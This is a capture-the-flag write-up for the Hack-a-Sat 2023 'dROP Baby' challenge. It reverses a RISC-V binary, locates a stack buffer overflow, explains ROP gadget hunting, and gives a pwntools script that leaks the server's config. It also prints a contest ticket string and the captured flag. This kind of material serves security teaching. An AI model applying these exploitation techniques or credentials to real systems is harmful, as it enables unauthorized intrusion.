# dROP Baby

Categories: Pwn

Description:
>I told you to be careful, you might dROP the baby!!
>
>(This challenge is running under emulation using qemu-riscv32 inside a Docker container with an Ubuntu 22.04 base image)
> 
>author: hack-a-sat-2023 organizers
>
>[drop-baby](src/drop-baby)

**Tags:** pwn, RISC-V, RISCV, Environment setup, ROP chain

## Takeaways

* ROP chain on RISC-V binaries
  * Finding gadgets:
    ```bash
    # If you have `c.`-prefixed instructions, use --align 2. Otherwise --align 4
    ROPgadget --binary drop-baby --align 2 \
      | grep -E 'sw|swsp|lw|lwsp|mv|sub|add|xor|jr|jalr|ret|ecall' \
      | grep -E '; (ret)|((c\.)?j(al)?r (x[0-9]{1,2}|zero|ra|sp|gp|tp|s[0-9]{1,2}|t[0-6]|fp|a[0-7]))$' \
      | tee gadgets.log
    ```
  * The first regex will filter gadgets that have only relevant opcodes to us.
  * The second regex is about how the gadget should end. All of our gadgets will end with either `jr` or `jalr` with a register as argument.
  * To invoke a function call and still retain control, we need:
    * (1) a gadget that loads `ra` to some value where the function should return afterwards and;
    * (2) that gadgets uses afterwards another register to jump to the target function with `jr/c.jr`. We do NOT want a `c.jalr` or `jalr ra` as these will mess up our link register `ra`.
* Binary ISA. By observing the binary's assembly, we see that it has both 16-bit `c.`-prefixed instructions and regular 32-bit instructions:
  * `c.`-prefix instructions are from the compressed 16-bit RV32C ISA and need to be 16-bit aligned
  * Regular 32-bit instructions are from the RV32 ISA
  * **The `C` extension allows 16-bit instructions to be freely intermixed with 32-bit instructions.** This really gives us many more gadgets than with only 32-bit instructions.
  * The `C` extension allows regular 32-bit instructions to start on any 16-bit boundary.
* `jalr rd1, rs1, imm` means: save in `rd1` the value of `pc+4` and jump to `rs1+offset`
* `c.jalr rs1` is equivalent to `jalr ra, rs1, 0` and stores in `ra` the value `pc+2`
  * `i.e.` Jump to `rs1` and stor in `ra` the value `pc+2`
* We are interested in the `lw` and `lwsp` gadgets as these gadgets can directly load values from the memory into the registers.
  * `lw` loads from *general* memory to registers.
  * `lwsp` loads from the stack, which we control, into the registers.
* `ecall` is uses for invoking syscalls


## Reversing

Let's start reversing the binary. Since this is a pwn challenge and the reversing here is just some tedious work, I won't elaborate too much.

### `main()` function

```c
int main(int argc,char **argv,char **environ) {
  char *flag;
  int flag_fd;
  int *piVar1;
  size_t sVar2;
  size_t sVar3;
  ulong timeout;
  
  setvbuf(stdout,NULL,2,0);
  flag = getenv("FLAG");
  if (flag == NULL) {
    puts("No flag present");
    exit(-1);
  }
  flag_fd = open("flag.txt",0x41,0x180);
  if (flag_fd < 0) {
    piVar1 = __errno_location();
    printf("Errno = %d trying to open flag.txt\n",*piVar1);
    exit(-1);
  }
  sVar2 = strlen(flag);
  sVar2 = write(flag_fd,flag,sVar2);
  sVar3 = strlen(flag);
  if (sVar3 != sVar2) {
    puts("Unable to write flag to file");
    exit(-1);
  }
  close(flag_fd);
  if (unsetenv("FLAG") == -1) {
    puts("Unable to clear environment");
    exit(-1);
  }

  flag = getenv("TIMEOUT");
  if (flag == NULL) {
    timeout = 10;
  } else {
    timeout = strtoul(flag,NULL,10);
    if (timeout == 0) {
      timeout = 10;
    }
  }
  signal(0xe,alarm_handler); //puts("Time\'s up!"); exit(1);
  alarm(timeout);
  puts("\nBaby\'s Second RISC-V Stack Smash\n");
  puts("No free pointers this time and pwning might be more difficult!");
  puts("Exploit me!");
  configDict.head = loadINI("server.ini");
  if (configDict.head == NULL) {
    exit(-1);
  }

  do {
    if (syncronize() == -1)
      return -1;
    flag_fd = read_message();
  } while (flag_fd != -1);
  return -1;
}

/**
 * simple boring state machine
 * Feel free to skip reading.
 * Required input: de ad be ef
 */
int syncronize(void) {
  char chr;
  int state = 0;
  int i = 0;
  do {
    if (read(0,&chr,1) < 1) {
      return -1;
    }
    i++;

    if (state == 3) {
      if (chr == '\xef')
        return 0; //success. Required input: de ad be ef
      else if (chr == '\xde')
        state = 1;
      else
        state = 0;
    } else if (state < 4) {
      if (state == 2) {
        if (chr == '\xbe')
          state = 3;
        else if (chr == '\xde')
          state = 1;
        else
          state = 0;
      } else if (state < 3) {
        if (state == 0) {
          if (chr == '\xde')
            state = 1;
        } else if (state == 1) {
          if (chr == '\xad')
            state = 2;
          else if (chr == '\xde')
            state = 1;
          else
            state = 0;
        }
      }
    }
  } while (i < 0xc9);
  return -1;
}
```

Here are our observations so far:

* This is similar to the [RISC-V-Smash-Baby#reversing](https://github.com/nikosChalk/ctf-writeups/tree/master/hack-a-sat-23/pwn/RISC-V-Smash-Baby#reversing) previous challenge, so I will briefly recap this part:
  * The binary reads two environment variables: `FLAG` and `TIMEOUT`.
  * `TIMEOUT` is (classically) used to prevent us from leaving open connections to the remote (nothing fancy). If not specified, it defaults to 10 seconds, so for our exploitation we will set it to something much higher (3600).
  * `FLAG` environment variable contains the flag value and writes it to the file `flag.txt`
  * The `unsetenv("FLAG")` function simply unsets the environment variable. However, it does **not** erase the memory. It simply shifts the all the elements in the `char *environ[]` array to the left by 1 ([setenv.c#264](https://codebrowser.dev/glibc/glibc/stdlib/setenv.c.html#264)). This means that the flag is still somewhere down the stack.
  * `syncronize()` is a boring state machine. Required input is `de ad be ef`.
* `loadINI("server.ini");` loads the specified INI file. If something goes wrong with the loading of the INI file, the program aborts.
* `read_message()` is where the program will read commands from us.

### expected INI format reversing

So, we do not have the `server.ini` file. This first thing to do is try to [understand its format](https://en.wikipedia.org/wiki/INI_file), and then leak the `server.ini` file that the remote has. After some reversing, we have the following:

*(Feel free to skip this section and read only the comments)*

```c
struct dict {
    struct pair * head;
};
struct pair {
    char * key;
    char * value;
    struct pair * next; //simple linked list
};
pair *configDict = NULL; //global variable

pair * loadINI(char *file) {
  ushort **ppuVar1;
  char *pcVar2;
  dict retval;
  char line [0x400];
  
  retval.head = NULL;
  FILE *__stream = fopen(file,"r");
  if (__stream == NULL)
    return NULL;

  //read line by line
  while ( (pcVar2 = fgets(line,0x400,__stream)) != NULL) {
    ppuVar1 = __ctype_b_loc();
    if ((((*ppuVar1)[(byte)line[0]] & 0x400) != 0) && (line[0] != '#')) { //skip lines that start with # (comments)
      addDictbyLine(&retval,line); //add a key-value pair
    }
  }
  fclose(__stream);
  return retval.head;
}

/**
 * Add a key-value pair.
 * The key-value separator is ':'
 */
int addDictbyLine(dict *dict,char *line) {
  char *value;
  ushort **ppuVar1;
  size_t local_18;
  char *local_14;
  
  if ((line == NULL) || (*line == '\0'))
    return -1;

  ppuVar1 = __ctype_b_loc();
  if (((*ppuVar1)[(byte)*line] & 8) == 0) {
    return -1;
  }
  if (dict == NULL) {
    return -1;
  }

  local_14 = strchr(line, ':');
  if (local_14 == NULL) {
    return -1;
  }
  
  *local_14 = '\0';
  local_18 = strlen(line);
  while( true ) {
    local_18 = local_18 - 1;
    ppuVar1 = __ctype_b_loc();
    if (((*ppuVar1)[(byte)line[local_18]] & 1) == 0) break;
    line[local_18] = '\0';
  }
  do {
    local_14 = local_14 + 1;
    value = local_14;
    if (*local_14 == '\0') break;
    ppuVar1 = __ctype_b_loc();
  } while (((*ppuVar1)[(byte)*local_14] & 1) != 0);
  for (; ((*local_14 != '\0' && (*local_14 != '\r')) && (*local_14 != '\n'));
      local_14 = local_14 + 1) {
  }
  *local_14 = '\0';
  addDictEntry(dict,line,value); //to the malloc() and node initialization

  return 0;
}

/**
 * insert into the dict linked list a new key-value pair
 */
int addDictEntry(dict *dict,char *key,char *value) {
  pair *ppVar1;
  pair *pair;
  
  if (dict == NULL)
    return -1;

  if (dict->head == NULL) {
    ppVar1 = (pair *)calloc(0xc,1);
    dict->head = ppVar1;
    if (dict->head == NULL)
      return -1;
    pair = dict->head;
  } else {
    for (pair = dict->head; pair->next != NULL; pair = pair->next) {
      /* noop */
    }
    ppVar1 = (pair *)calloc(0xc,1);
    pair->next = ppVar1;
    if (pair->next == NULL)
      return -1;
    pair = pair->next;
  }

  pair->key = (char *)calloc(strlen(key)+1, 1);
  pair->value = (char *)calloc(strlen(value)+1, 1);
  pair->next = NULL;
  if ((pair->key == NULL) || (pair->value == NULL)) {
    return -1;
  }

  strcpy(pair->key,key);
  strcpy(pair->value,value);

  return 0;
}
```

* [what is `__ctype_b_loc()`](https://stackoverflow.com/questions/37702434/ctype-b-loc-what-is-its-purpose)
* The character `:` is used as key-value separator
* If a line starts with the character `#`, then it is a comment
* Lines are separated with either `\r` or `\n`
* (The return value of `addDictEntry` is not checked)

### `read_message()` function - Expected commands

Now, let's check the `read_message` function to understand how the binary processes the INI file and how can we interact with it:

```c
int read_message(void) {
  char *pcVar1;
  int iVar2;
  byte control_chr;
  int sz;
  ssize_t nread;
  int retval;
  
  nread = read(0,&control_chr,1);
  if (nread != 1)
    return -1;

  if (control_chr == '\xb2') {
    pcVar1 = (char *)findDict(configDict.head,"B2_MSG_LEN");
    sz = atoi(pcVar1);
    return do_b2_BOF(sz);
  } else {
    if (control_chr < '\xb3') {
      if (control_chr == '\xb1') {
        pcVar1 = (char *)findDict(configDict.head,"B1_MSG_LEN");
        sz = atoi(pcVar1);
        return do_b1_printDict(sz);
      }
      if (control_chr < '\xb2') {
        if (control_chr == '\xa1') {
          pcVar1 = (char *)findDict(configDict.head,"A1_MSG_LEN");
          sz = atoi(pcVar1);
          return do_a1(sz);
        }
        if (control_chr == '\xa2') {
          pcVar1 = (char *)findDict(configDict.head,"A2_MSG_LEN");
          sz = atoi(pcVar1);
          return do_a2_addEntry(sz);
        }
      }
    }
    retval = -1;
  }
  return retval;
}


int do_b2(size_t sz) {
  //spoiler alert: buffer overflow here
  int iVar1;
  char acStack_78 [100];

  if (read(0,acStack_78,sz) < sz) {
    return -1;
  }
  if (check_message_crc(acStack_78,sz) == -1)
    return -1;
  return 0;
}

int do_b1_printDict(size_t sz) {
  int iVar1;
  char acStack_78 [100];
  uint local_14;
  
  if (read(0,acStack_78,sz) < sz)
    return -1;
  if (check_message_crc(acStack_78,sz) == -1)
    return -1;
  printDict(configDict.head);
  return 0;
}

int check_message_crc(char *buf,int sz) {
  int checksum = crc32(0,buf, sz-4);
  if (checksum == *(int *)(buf+sz-4)) {
    return 0;
  } else {
    return -1;
  }
}
```

Here are our observations:

* Command `b1` prints the INI file that the remote has. However, we need to guess the correct value of the key `B1_MSG_LEN` in order to print it. This is easily brute-forcable
* Spoiler alert: After leaking the server INI, the command `b2` reads `sz=ini.get("B2_MSG_LEN")` bytes into a buffer of `100` bytes. This `sz` is configured to be `300` bytes in the remote.

I won't waste any more time for reversing.

## Pwning

Let's pwn the binary now. We have identified the buffer overflow function. Let's write a script first that prints the `server.ini` file:

```python
from pwn import *
import sys
import os

context.binary = elfexe = ELF('./drop-baby')
def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([elfexe.path] + argv, gdbscript, elfexe.path, *a, *kw)
    else:
        target = process([elfexe.path] + argv, *a, **kw)
    return target

gdbscript = ''

# Brute-force the B1_MSG_LEN
mydata = b''
while True:
    mydata += b'A'
    print(f"Attempting data len: {len(mydata)}")

    if args['REMOTE']:
        remote_server = 'drop.quals2023-kah5Aiv9.satellitesabove.me'
        remote_port = 5300    
        io = remote(remote_server, remote_port)
        io.recvline() # Ticket please:
        io.send(b'ticket{alpha542765whiskey4:GLnT34rPAupXSBMNiLWcgk0dLhUeF5gSSzxqnownNALObAoYzg8MHH0jle5Ttq7FXw}\n')
    else:
        os.environ['FLAG'] = 'hackasat{dummy-flag}'
        os.environ['TIMEOUT'] = '3600'
        io = start()
    io.recvline_endswith(b'Exploit me!')
    io.send(b'\xde\xad\xbe\xef') # sync prefix
    io.send(b'\xb1') # read_message
    payload = mydata + p32(crc.crc_32(mydata))
    io.send(payload)
    printed_data = io.recvall(timeout=2)
    if len(printed_data) > 0:
        print(printed_data.decode('ascii'))
        sys.exit(0)
    io.close()
```

After running the above script, we get the `server.ini` file:

```log
------------------------------
|Application Name : Baby dROP|
|      A1_MSG_LEN : 40       |
|      A2_MSG_LEN : 10       |
|      B1_MSG_LEN : 20       |
|      B2_MSG_LEN : 300      |
|      CC_MSG_LEN : 25       |
|      ZY_MSG_LEN : 0        |
|   SILENT_ERRORS : TRUE     |
------------------------------
```

Great, now let's identify the binary's security properties:

```sh
nikos@ctf-box:~$ checksec --file=./drop-baby
[*] '~/drop-baby'
    Arch:     riscv-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x10000)
```

Great, no PIE!. Let's search for useful gadgets using [ROPgadget](https://github.com/JonathanSalwan/ROPgadget). Generally, we want to control:

* `a0,a1,a2,...` when making function calls as these are the argument registers
* `ra` as this is the return address where a function call should return when finished
* Find `jr` and `jalr` gadgets as these will compose our ROP chain.

Also, we notice in the disassembly that many instructions start with the `c.` prefix. These are compressed 16-bit instructions (RCV) instead of the regular 32-bit instructions and are referred in the ["C" Standard Extension for Compressed Instructions in the RISC-V ISA](https://riscv.org/wp-content/uploads/2019/06/riscv-spec.pdf):

> The "C" extension can be added to any of the base ISAs (RV32,
RV64, RV128), and we use the generic term “RVC” to cover any of these. Typically, 50%–60% of the RISC-V instructions in a program can be replaced with RVC instructions, resulting in a 25%–30% code-size reduction.
> 
> RVC uses a simple compression scheme that offers shorter 16-bit versions of common 32-bit RISC-V instructions
>
>The C extension is compatible with all other standard instruction extensions. The C extension allows 16-bit instructions to be freely intermixed with 32-bit instructions, with the latter now able to start on any 16-bit boundary.

Here is a one liner to search for gadgets in our binary:

```bash
ROPgadget --binary drop-baby --align 4 \
  | grep -E 'sw|swsp|lw|lwsp|mv|sub|add|xor|jr|jalr|ret|ecall' \
  | grep -E '; (ret)|((c\.)?j(al)?r (x[0-9]{1,2}|zero|ra|sp|gp|tp|s[0-9]{1,2}|t[0-6]|fp|a[0-7]))$' \
  | tee gadgets.log
```

* The first regex will filter gadgets that have only relevant opcodes to us.
* The second regex is about how the gadget should end. All of our gadgets will end with either `jr` or `jalr` with a register as argument.
  * `ret` is the same as `jalr x0, ra, 0`
  * `ret` is the same as `jr ra`
  * If we are doing function calls, we want our gadgets to **not** end with `j(al)?r ra`. This is because the function call will use the `ra` register in the `ret` instruction to return to our next ROP gadget.
* We are interested in the `lwsp` gadgets as these gadgets can directly load values from the stack (which we control) into our registers
* `ecall` is uses for invoking syscalls, but we have libc statically linked so we don't use it.

Now for the ROP chain payload we have two solutions:

1. [solution-cheesy.py](./src/solution-cheesy.py) - Abuses the fact that the flag is still somewhere in the stack. It finds the address of the flag in the stack and then does `puts(flag)`.
2. [solution.py](./src/solution.py) - More hardcore ROP solution. It performs the following function calls with a ROP chain:
    ```c
    fd=open("flag.txt", O_RDONLY);
    read(fd, buf, 0x100);
    write(1, buf, 0x100); //write to stdout
    ```
    After each function call, we re-trigger the buffer overflow as the whole ROP chain does not fit into the 300 (`B2_MSG_LEN`) bytes that we can write.

When we execute our ROP chain, we get the flag!

`flag{alpha542765whiskey4:GPqdDffrVbrK2ekLBBHPPxTAaVlGiyUaeB9ijBy4P9tHCyW_yprbd-CFQNnPe68Rl3Hp5rQCn2KErFL1AJY9CWk}`
